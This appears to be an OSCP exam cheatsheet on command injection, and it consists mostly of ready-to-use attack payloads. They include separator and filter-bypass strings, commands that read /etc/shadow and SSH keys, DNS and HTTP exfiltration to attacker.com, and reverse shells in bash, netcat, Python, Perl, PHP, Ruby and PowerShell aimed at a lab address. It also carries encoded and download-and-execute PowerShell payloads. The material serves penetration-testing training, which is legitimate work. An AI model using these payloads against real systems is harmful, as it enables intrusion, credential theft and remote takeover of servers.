    Command Injection

    Overview

    Command Injection allows attackers to execute arbitrary system commands on a server through vulnerable input fields. This cheatsheet covers practical techniques for OSCP exam scenarios.

    Quick Detection

    Basic Detection Payloads

    Linux: 

    ; whoami
| whoami
|| whoami
& whoami
&& whoami
` whoami `
$(whoami)

# With delay detection
; sleep 5
| sleep 5 
`sleep 5`
$(sleep 5)

    Windows: 

    & whoami
&& whoami
| whoami
|| whoami

# With delay
& timeout 5
| ping -n 5 127.0.0.1

    Command Separators

    Linux/Unix

    Separator Description Example
    ; Execute next command cmd1; cmd2
    \| Pipe output to next command cmd1 \| cmd2
    \|\| OR - Execute if first fails cmd1 \|\| cmd2
    & Run in background cmd1 & cmd2
    && AND - Execute if first succeeds cmd1 && cmd2
    ` Command substitution `whoami`
    $() Command substitution $(whoami)
    \n Newline (URL: %0a) cmd1%0acmd2

    Windows

    Separator Description Example
    & Execute both commands cmd1 & cmd2
    && Execute if first succeeds cmd1 && cmd2
    \| Pipe output cmd1 \| cmd2
    \|\| Execute if first fails cmd1 \|\| cmd2
    \n Newline cmd1\ncmd2

    Basic Exploitation

    Linux Commands

    # Identify OS
; uname -a
| cat /etc/issue
&& cat /etc/os-release

# Current user
; whoami
| id
&& id

# List files
; ls -la
| ls /
&& pwd

# Read files
; cat /etc/passwd
| cat /etc/shadow
&& cat /home/user/.ssh/id_rsa

# Network info
; ifconfig
| ip a
&& netstat -tulpn

    Windows Commands

    REM Identify OS
& ver
&& systeminfo

REM Current user
& whoami
&& whoami /priv
| whoami /groups

REM List files
& dir
&& dir C:\
| dir /s /b

REM Read files
& type C:\windows\win.ini
&& type C:\inetpub\wwwroot\web.config

REM Network info
& ipconfig
&& ipconfig /all
| netstat -an

    Filter Bypass Techniques

    1. Case Manipulation (Linux)

    # Original: whoami
WHOAMI
WhoAmI
wHoAmI

# Using variables
; $0  # Executes shell
; ${PATH:0:1}bin${PATH:0:1}whoami

    2. Wildcards

    # Linux
; /bin/wh?ami
; /bin/who*
; /???/??t /etc/passwd

# Windows
& who*mi
& w?oami

    3. Character Encoding

    Hex Encoding: 

    ; \x77\x68\x6f\x61\x6d\x69  # whoami in hex
; $(echo -e "\x77\x68\x6f\x61\x6d\x69")

    Octal Encoding: 

    ; $(printf "\\167\\150\\157\\141\\155\\151")

    Base64: 

    ; echo d2hvYW1p | base64 -d | bash
; `echo d2hvYW1p | base64 -d`

    4. Variable Expansion (Linux)

    ; $USER
; ${USER}
; ${PATH}
; ${HOME}
; ${SHELL}

# IFS bypass (space filter)
; cat${IFS}/etc/passwd
; cat${IFS}${IFS}/etc/passwd
; {cat,/etc/passwd}

    5. Quote Bypass

    # Linux - Insert quotes in middle
; w"h"o"a"mi
; w'h'o'a'mi
; who$@ami
; who$()ami

# Windows
& who"am"i
& who^am^i

    6. Backslash Bypass (Linux)

    ; w\h\o\a\m\i
; who\ami

    7. Comment Bypass

    # Linux
; w#comment
hoami

REM Windows  
& who^%comment%^ami

    8. Brace Expansion

    ; {cat,/etc/passwd}
; {ls,-la}

    9. Newline/Tab Injection

    # URL encoded
%0a whoami      # newline (\n)
%0d whoami      # carriage return (\r)
%09 whoami      # tab (\t)
%20 whoami      # space

# Example
ip=127.0.0.1%0awhoami

    10. Concatenation

    # Linux
; who$@ami
; who``ami
; who$()ami

# Windows
& who""ami
& set x=whoami&%x%

    Space Bypass Techniques

    Linux

    # Internal Field Separator
; cat${IFS}/etc/passwd
; cat$IFS/etc/passwd
; {cat,/etc/passwd}

# Tab
; cat%09/etc/passwd
; cat\t/etc/passwd

# Brace expansion
; {cat,/etc/passwd}

# Redirection
; cat</etc/passwd
; cat<>/etc/passwd

    Windows

    REM Tab
& dir%09C:\

REM Variable
& set%09x=whoami&%x%

    Keyword/Blacklist Bypass

    If "cat" is blocked:

    # Alternatives
; tac /etc/passwd
; head /etc/passwd
; tail /etc/passwd
; more /etc/passwd
; less /etc/passwd
; nl /etc/passwd
; sed '' /etc/passwd
; awk '{print}' /etc/passwd
; sort /etc/passwd
; strings /etc/passwd
; od -c /etc/passwd

# Character insertion
; c"a"t /etc/passwd
; c'a't /etc/passwd
; c\at /etc/passwd
; c$@at /etc/passwd

# Variable usage
; $0 # spawns shell
; ${PATH:0:1}bin${PATH:0:1}cat

    If "whoami" is blocked:

    # Alternatives
; id
; id -un
; echo $USER
; w
; who am i

# Character insertion
; who"a"mi
; who'a'mi
; who\ami

    If "/" is blocked:

    # Current directory
; cat passwd  # if in /etc

# Using variables
; cat ${HOME}passwd
; cat ${PATH:0:1}etc${PATH:0:1}passwd

    Out-of-Band (OOB) Techniques

    DNS Exfiltration

    # Linux
; nslookup $(whoami).attacker.com
; dig $(whoami).attacker.com
; host $(whoami).attacker.com

# Exfiltrate data
; nslookup $(cat /etc/passwd | base64).attacker.com

    Setup DNS listener: 

    # tcpdump
sudo tcpdump -i tun0 udp port 53

# dnslog.cn or Burp Collaborator

    HTTP Exfiltration

    # Linux
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/?data=$(whoami)
; curl http://attacker.com --data "$(cat /etc/passwd)"

# Windows
& powershell -c "Invoke-WebRequest -Uri http://attacker.com/?data=$(whoami)"

    Setup listener: 

    python3 -m http.server 80
nc -lvnp 80

    Ping Exfiltration

    # Count-based confirmation
; ping -c 5 attacker.com  # If vulnerable, you'll see 5 pings

# Windows
& ping -n 5 attacker.com

    Time-Based Detection

    # Linux
; sleep 5
; ping -c 5 127.0.0.1

# Windows
& timeout 5
& ping -n 5 127.0.0.1

    Reverse Shells

    Linux Reverse Shells

    Bash: 

    ; bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
; bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
| bash -c 'exec bash -i &>/dev/tcp/10.10.14.5/4444 <&1'

    Netcat: 

    ; nc 10.10.14.5 4444 -e /bin/bash
; nc -e /bin/sh 10.10.14.5 4444
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f

    Python: 

    ; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

    Perl: 

    ; perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

    PHP: 

    ; php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

    Ruby: 

    ; ruby -rsocket -e'f=TCPSocket.open("10.10.14.5",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

    Windows Reverse Shells

    PowerShell: 

    & powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

& powershell -nop -c "$client = New-Object Net.Sockets.TCPClient('10.10.14.5',4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"

    PowerShell Download + Execute: 

    & powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')"

    Netcat (if available): 

    & nc.exe 10.10.14.5 4444 -e cmd.exe

    Encoded Payloads

    Base64 Encoding

    Linux: 

    # Encode
echo -n 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' | base64

# Execute
; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQ== | base64 -d | bash
; `echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQ== | base64 -d`

    Windows: 

    # Encode payload
$command = 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.5/shell.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

# Execute
& powershell -enc <BASE64_STRING>

    URL Encoding

    # Encode special characters
; whoami          # Original
%3b%20whoami      # URL encoded
%253b%2520whoami  # Double encoded

    Time-Based Detection

    # Linux
; sleep 5
| sleep 10 
&& ping -c 10 127.0.0.1

# Windows
& timeout 5
&& ping -n 10 127.0.0.1

    DNS-Based Detection

    ; nslookup $(whoami).attacker.com
; dig test.attacker.com
| host confirm.attacker.com

    File-Based Detection

    # Create marker file
; touch /tmp/pwned
; echo test > /var/www/html/proof.txt

# Windows
& echo test > C:\inetpub\wwwroot\proof.txt

    HTTP-Based Detection

    # Linux
; curl http://attacker.com/confirm
; wget http://attacker.com/confirm

# Windows
& powershell -c "Invoke-WebRequest http://attacker.com/confirm"

    OSCP Exam Workflow

    Phase 1: Detection (2-5 min)

    • [ ] Test basic separators: ; whoami, | whoami, & whoami
    • [ ] Try time-based: ; sleep 5
    • [ ] Check OS: Linux vs Windows
    • [ ] Verify injection point

    Phase 2: Bypass Filters (5-15 min)

    • [ ] Test character encoding
    • [ ] Try space bypass: ${IFS}, {cmd,arg}
    • [ ] Use quotes: who"a"mi
    • [ ] Try wildcards: who*mi
    • [ ] Test case variations

    Phase 3: Exploitation (5-10 min)

    • [ ] Execute basic commands
    • [ ] Enumerate system
    • [ ] Locate sensitive files
    • [ ] Check network connectivity

    Phase 4: Get Shell (5-15 min)

    • [ ] Setup listener: nc -lvnp 4444
    • [ ] Execute reverse shell
    • [ ] Verify shell access
    • [ ] Upgrade shell if needed

    Common Injection Points

    Web Applications

    # URL parameters
http://target.com/ping?ip=127.0.0.1; whoami
http://target.com/cmd?exec=ls; id

# POST data
ip=127.0.0.1; whoami
filename=test; cat /etc/passwd

# HTTP headers
User-Agent: ; whoami
Referer: ; id
X-Forwarded-For: ; whoami

    Common Vulnerable Functions

    PHP: 

    system($_GET['cmd']);
exec($_GET['cmd']);
shell_exec($_GET['cmd']);
passthru($_GET['cmd']);
`$_GET['cmd']`;
popen($_GET['cmd'], 'r');
proc_open($_GET['cmd']);

    Python: 

    os.system(user_input)
os.popen(user_input)
subprocess.call(user_input, shell=True)
eval(user_input)

    Node.js: 

    child_process.exec(user_input)
child_process.spawn(user_input)
eval(user_input)

    Manual with Burp Suite

    1. Intercept request
2. Send to Repeater/Intruder
3. Fuzz injection points with payloads
4. Look for delays, errors, or data exfiltration

    Pro Tips

    Quick Wins

    • Always test all separators: ; | & && ||
    • Try time-based detection if output is hidden
    • Use OOB techniques for blind injection
    • Test both Linux and Windows payloads
    • URL-encode payloads in GET parameters

    Common Mistakes

    • Not URL-encoding special characters
    • Forgetting to escape quotes in commands
    • Not testing for blind injection
    • Giving up too early on filter bypass
    • Not setting up proper listeners

    OSCP Exam

    • Document all injection points
    • Screenshot working payloads
    • Note the exact command used
    • Keep track of bypass techniques that worked
    • Have reverse shell payloads ready to copy-paste

    Summary

    Remember:

    1. Test all separators - ; | & && ||
    2. Try bypass techniques - encoding, quotes, wildcards
    3. Use time-based for blind injection
    4. OOB exfiltration when output is hidden
    5. Have shells ready - Bash, Python, PowerShell
    6. Document everything for the report
